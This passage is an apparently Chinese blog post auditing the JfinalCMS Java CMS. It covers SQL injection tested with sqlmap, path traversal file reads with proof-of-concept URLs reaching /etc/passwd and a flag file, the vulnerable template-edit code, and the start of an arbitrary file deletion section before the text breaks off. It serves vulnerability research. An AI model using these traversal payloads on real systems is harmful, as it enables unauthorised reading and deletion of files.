@@ -1,0 +1,594 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>Jfinalcms代码审计 - 剑胆琴心</title><meta name="author" content="剑胆琴心">
+<meta name="author-link" content="http://shuai06.github.io">
+<meta name="description" content="剑胆琴心的技术博客" /><meta name="keywords" content='代码审计, Java安全, 渗透测试' />
+  <meta itemprop="name" content="Jfinalcms代码审计">
+  <meta itemprop="description" content="剑胆琴心的技术博客">
+  <meta itemprop="datePublished" content="2024-07-07T16:52:41+08:00">
+  <meta itemprop="dateModified" content="2024-07-07T11:11:00+00:00">
+  <meta itemprop="wordCount" content="958">
+  <meta itemprop="image" content="https://shuai06.github.io/logo.png">
+  <meta itemprop="keywords" content="代码审计,Java安全,渗透测试"><meta property="og:url" content="https://shuai06.github.io/jfinalcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+  <meta property="og:site_name" content="剑胆琴心">
+  <meta property="og:title" content="Jfinalcms代码审计">
+  <meta property="og:description" content="剑胆琴心的技术博客">
+  <meta property="og:locale" content="zh_CN">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-07-07T16:52:41+08:00">
+    <meta property="article:modified_time" content="2024-07-07T11:11:00+00:00">
+    <meta property="article:tag" content="代码审计">
+    <meta property="article:tag" content="Java安全">
+    <meta property="article:tag" content="渗透测试">
+    <meta property="og:image" content="https://shuai06.github.io/logo.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://shuai06.github.io/logo.png">
+  <meta name="twitter:title" content="Jfinalcms代码审计">
+  <meta name="twitter:description" content="剑胆琴心的技术博客">
+<meta name="application-name" content="剑胆琴心">
+<meta name="apple-mobile-web-app-title" content="剑胆琴心"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://shuai06.github.io/jfinalcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" /><link rel="prev" href="https://shuai06.github.io/oasys%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "Jfinalcms代码审计",
+    "inLanguage": "zh-CN",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/shuai06.github.io\/jfinalcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1\/"
+    },"image": [{
+              "@type": "ImageObject",
+              "url": "https:\/\/shuai06.github.io\/images\/Apple-Devices-Preview.jpg",
+              "width":  1842 ,
+              "height":  1036 
+            }],"genre": "posts","keywords": "代码审计, Java安全, 渗透测试","wordcount":  958 ,
+    "url": "https:\/\/shuai06.github.io\/jfinalcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1\/","datePublished": "2024-07-07T16:52:41+08:00","dateModified": "2024-07-07T11:11:00+00:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+      "@type": "Organization",
+      "name": "剑胆琴心","logo": {
+          "@type": "ImageObject",
+          "url": "https:\/\/shuai06.github.io\/images\/avatar.png",
+          "width":  438 ,
+          "height":  438 
+        }},"author": {
+        "@type": "Person",
+        "name": "剑胆琴心"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="剑胆琴心"><img
+    class="lazyload logo"
+    src="/svg/loading.min.svg"
+    data-src="/images/avatar.png"
+    data-srcset="/images/avatar.png, /images/avatar.png 1.5x, /images/avatar.png 2x"
+    data-sizes="auto"
+    alt="剑胆琴心"
+    title="剑胆琴心" width="438" height="438"/><span class="header-title-text">剑胆琴心</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 所有文章</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/friends/"
+                title="友情链接"
+                
+              ><i class="fa-solid fa-users fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="搜索文章标题或内容 ..." id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li>
+      </ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="剑胆琴心"><img
+    class="lazyload logo"
+    src="/svg/loading.min.svg"
+    data-src="/images/avatar.png"
+    data-srcset="/images/avatar.png, /images/avatar.png 1.5x, /images/avatar.png 2x"
+    data-sizes="auto"
+    alt="/images/avatar.png"
+    title="/images/avatar.png" width="438" height="438"/><span class="header-title-text">剑胆琴心</span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="搜索文章标题或内容 ..." id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              取消
+            </a>
+          </li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 所有文章</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/friends/"
+                  title="友情链接"
+                  
+                ><i class="fa-solid fa-users fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li
+              class="menu-item text-center"
+            ><a
+                  class="menu-link"
+                  href="https://github.com/shuai06"
+                  title="GitHub"
+                  rel="noopener noreferrer" target="_blank"
+                ><i class='fa-brands fa-github fa-fw' aria-hidden='true'></i> </a></li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="container" data-page-style="normal"><aside class="toc" id="toc-auto"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside>
+
+  <aside class="aside-custom">
+    </aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX">
+        <span>Jfinalcms代码审计</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><a href="http://shuai06.github.io" title="作者"target="_blank" rel="external nofollow noopener noreferrer author" class="author"><img
+    class="lazyload avatar"
+    src="/svg/loading.min.svg"
+    data-src="/images/avatar.png"
+    data-srcset="/images/avatar.png, /images/avatar.png 1.5x, /images/avatar.png 2x"
+    data-sizes="auto"
+    alt="剑胆琴心"
+    title="剑胆琴心" width="438" height="438"/>&nbsp;剑胆琴心</a></span>
+          <span class="post-category">收录于 <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 代码审计</a></span></div>
+      <div class="post-meta-line"><span title=2024-07-07&#32;16:52:41><i class="fa-regular fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-07-07">2024-07-07</time></span>&nbsp;<span><i class="fa-solid fa-pencil-alt fa-fw" aria-hidden="true"></i> 约 958 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw" aria-hidden="true"></i> 预计阅读 2 分钟</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>目录</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#简介">简介</a></li>
+    <li><a href="#sql注入">SQL注入</a></li>
+    <li><a href="#xss">XSS</a></li>
+    <li><a href="#前台任意文件读取">前台任意文件读取</a></li>
+    <li><a href="#任意文件读取">任意文件读取</a></li>
+    <li><a href="#任意文件删除">任意文件删除</a></li>
+    <li><a href="#任意文件读取-1">任意文件读取</a></li>
+    <li><a href="#ssti">SSTI</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><h2 id="简介">简介</h2>
+<p>框架使用的Jfinal，模板引擎使用的beetl</p>
+<p>项目中的pom.xml记录了项目需要的依赖及其版本信息等，审计源码前，可以看看项目的给类依赖是否为存在漏洞的版本，如果有可以针对某个依赖的当前版本存在的漏洞进行验证。</p>
+<h2 id="sql注入">SQL注入</h2>
+<p>jfinal 框架下的预处理为如下，使用占位符：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Long</span><span class="w"> </span><span class="n">count</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Db</span><span class="p">.</span><span class="na">queryLong</span><span class="p">(</span><span class="s">&#34;select count(1) from cms_admin where username = ?&#34;</span><span class="p">,</span><span class="n">username</span><span class="p">);</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里使用拼接方式进行数据查询，导致SQL注入：</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707190258530.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707190258530.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707190258530.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707190258530.png 2x"
+    data-sizes="auto"
+    alt="image-20240707190258530"
+    title="image-20240707190258530"/></p>
+<p>网上追溯，找到source点：</p>
+<p>找到在<code>com/cms/controller/admin/AdminController.java#index()</code>里，传入的name、username参数未做任何处理就被传递给<code>findPage()</code>，那么这里是存在SQL注入的。</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707190317616.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707190317616.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707190317616.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707190317616.png 2x"
+    data-sizes="auto"
+    alt="image-20240707190317616"
+    title="image-20240707190317616"/></p>
+<p>测试：</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707190517209.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707190517209.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707190517209.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707190517209.png 2x"
+    data-sizes="auto"
+    alt="image-20240707190517209"
+    title="image-20240707190517209"/></p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707190510186.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707190510186.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707190510186.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707190510186.png 2x"
+    data-sizes="auto"
+    alt="image-20240707190510186"
+    title="image-20240707190510186"/></p>
+<p>直接用sqlmap跑：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost:8080/admin/admin?name=1
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707190900237.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707190900237.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707190900237.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707190900237.png 2x"
+    data-sizes="auto"
+    alt="image-20240707190900237"
+    title="image-20240707190900237"/></p>
+<h2 id="xss">XSS</h2>
+<h2 id="前台任意文件读取">前台任意文件读取</h2>
+<p>网上已知这个漏洞的poc：<code>/common/down/file?filekey=/../../../../../../../../../etc/passwd</code></p>
+<p>我们根据poc去寻找一下，搜索<code>/common/down</code></p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707170721178.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707170721178.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707170721178.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707170721178.png 2x"
+    data-sizes="auto"
+    alt="image-20240707170721178"
+    title="image-20240707170721178"/></p>
+<p>可以看到直接从前端获取文件参数，且没有进行过滤，可以使用<code>../</code>跨目录读取文件：</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707170813575.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707170813575.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707170813575.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707170813575.png 2x"
+    data-sizes="auto"
+    alt="image-20240707170813575"
+    title="image-20240707170813575"/></p>
+<p>构造请求：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://192.168.3.214:8080/common/down/file?fileKey=/../../../../../../../../../../../../../../../../../tmp/flag.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707171313474.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707171313474.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707171313474.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707171313474.png 2x"
+    data-sizes="auto"
+    alt="image-20240707171313474"
+    title="image-20240707171313474"/></p>
+<h2 id="任意文件读取">任意文件读取</h2>
+<p>可以搜索的关键字：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">org.apache.commons.io.FileUtils
+</span></span><span class="line"><span class="cl">org.springframework.stereotype.Controller
+</span></span><span class="line"><span class="cl">import java.nio.file.Files
+</span></span><span class="line"><span class="cl">import java.nio.file.Path
+</span></span><span class="line"><span class="cl">import java.nio.file.Paths
+</span></span><span class="line"><span class="cl">import java.util.Scanner
+</span></span><span class="line"><span class="cl">sun.nio.ch.FileChannelImpl
+</span></span><span class="line"><span class="cl">java.io.File.list/listFiles
+</span></span><span class="line"><span class="cl">java.io.FileInputStream
+</span></span><span class="line"><span class="cl">java.io.FileOutputStream
+</span></span><span class="line"><span class="cl">java.io.FileSystem/Win32FileSystem/WinNTFileSystem/UnixFileSystem
+</span></span><span class="line"><span class="cl">sun.nio.fs.UnixFileSystemProvider/WindowsFileSystemProvider
+</span></span><span class="line"><span class="cl">java.io.RandomAccessFile
+</span></span><span class="line"><span class="cl">sun.nio.fs.CopyFile
+</span></span><span class="line"><span class="cl">sun.nio.fs.UnixChannelFactory
+</span></span><span class="line"><span class="cl">sun.nio.fs.WindowsChannelFactory
+</span></span><span class="line"><span class="cl">java.nio.channels.AsynchronousFileChannel
+</span></span><span class="line"><span class="cl">FileUtil/IOUtil
+</span></span><span class="line"><span class="cl">BufferedReader
+</span></span><span class="line"><span class="cl">readAllBytes
+</span></span><span class="line"><span class="cl">scanner
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>漏洞点在后台：点击“编辑”的时候，响应会显示文件内容</p>
+<p>这个漏洞点在<code>com/cms/controller/admin/TemplateController.java</code>中的edit方法：</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707172003419.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707172003419.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707172003419.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707172003419.png 2x"
+    data-sizes="auto"
+    alt="image-20240707172003419"
+    title="image-20240707172003419"/></p>
+<p>如果目录<strong>directory</strong>为空的话，则默认就是要传入的文件名</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="w">	</span><span class="cm">/**
+</span></span></span><span class="line"><span class="cl"><span class="cm">	 * 编辑
+</span></span></span><span class="line"><span class="cl"><span class="cm">	 */</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">edit</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="n">String</span><span class="w"> </span><span class="n">fileName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getPara</span><span class="p">(</span><span class="s">&#34;fileName&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="n">String</span><span class="w"> </span><span class="n">directory</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getPara</span><span class="p">(</span><span class="s">&#34;directory&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">StringUtils</span><span class="p">.</span><span class="na">isBlank</span><span class="p">(</span><span class="n">fileName</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">    </span><span class="c1">//filename不能为空</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="n">render</span><span class="p">(</span><span class="n">CommonAttribute</span><span class="p">.</span><span class="na">ADMIN_ERROR_VIEW</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="k">return</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="n">setAttr</span><span class="p">(</span><span class="s">&#34;directory&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">directory</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="n">setAttr</span><span class="p">(</span><span class="s">&#34;fileName&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">fileName</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="n">String</span><span class="w"> </span><span class="n">filePath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="k">if</span><span class="p">(</span><span class="n">StringUtils</span><span class="p">.</span><span class="na">isNotBlank</span><span class="p">(</span><span class="n">directory</span><span class="p">)){</span><span class="w">   </span><span class="c1">// 目录directory为空和不为空是两种情况，如果目录不为空，则就是以那个目录开始寻找文件</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="n">filePath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;/&#34;</span><span class="o">+</span><span class="n">directory</span><span class="p">.</span><span class="na">replaceAll</span><span class="p">(</span><span class="s">&#34;,&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;/&#34;</span><span class="p">)</span><span class="o">+</span><span class="s">&#34;/&#34;</span><span class="o">+</span><span class="n">fileName</span><span class="p">;</span><span class="w"> </span><span class="c1">//把逗号替换为/,拼接为完整的路径</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="p">}</span><span class="k">else</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="n">filePath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;/&#34;</span><span class="o">+</span><span class="n">fileName</span><span class="p">;</span><span class="w">  </span><span class="c1">//如果目录directory为空的话，则默认就是要传入的文件名</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="n">setAttr</span><span class="p">(</span><span class="s">&#34;content&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">StringEscapeUtils</span><span class="p">.</span><span class="na">escapeHtml</span><span class="p">(</span><span class="n">TemplateUtils</span><span class="p">.</span><span class="na">read</span><span class="p">(</span><span class="n">filePath</span><span class="p">)));</span><span class="w">  </span><span class="c1">//读取</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="n">render</span><span class="p">(</span><span class="n">getView</span><span class="p">(</span><span class="s">&#34;template/edit&#34;</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Poc:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># directory为空</span>
+</span></span><span class="line"><span class="cl">http://192.168.3.214:8080/admin/template/edit?fileName<span class="o">=</span>../../../../../../../../../../../../../../../../../../tmp/flag.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># directory不为空</span>
+</span></span><span class="line"><span class="cl">http://192.168.3.214:8080/admin/template/edit?fileName<span class="o">=</span>../../../../../../../../../../../../../../../../../../tmp/flag.txt<span class="p">&amp;</span><span class="nv">directory</span><span class="o">=</span>default,static
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707172428224.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707172428224.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707172428224.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707172428224.png 2x"
+    data-sizes="auto"
+    alt="image-20240707172428224"
+    title="image-20240707172428224"/></p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707172734102.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707172734102.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707172734102.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707172734102.png 2x"
+    data-sizes="auto"
+    alt="image-20240707172734102"
+    title="image-20240707172734102"/></p>
+<h2 id="任意文件删除">任意文件删除</h2>
+<p>都是<code>admin/template</code>接口中的，这个是<code>delete</code></p>
+<p>可以看到没有任何过滤，可以删除任意文件：</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
